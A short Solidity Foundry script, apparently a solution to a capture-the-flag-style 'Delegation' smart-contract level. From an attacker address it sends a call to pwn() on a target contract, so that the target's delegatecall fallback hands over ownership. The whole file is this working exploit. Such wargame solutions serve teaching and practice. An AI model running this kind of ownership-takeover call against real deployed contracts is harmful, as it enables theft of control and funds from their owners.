// SDPX-License-Identifier: MIT

pragma solidity ^0.6.2;

import {Script, console} from "forge-std/Script.sol";

import {Constants} from "./Constants.s.sol";

contract DelegationAttacker is Constants, Script {

    function run() public {
        vm.startBroadcast(ATTACKER_ADDRESS);
        attack();
        vm.stopBroadcast();
    }
    
    function attack() private {
        (bool success, ) = DELEGATION_ADDRESS.call(abi.encodeWithSignature("pwn()"));
        console.log("Success: ", success);
    }
}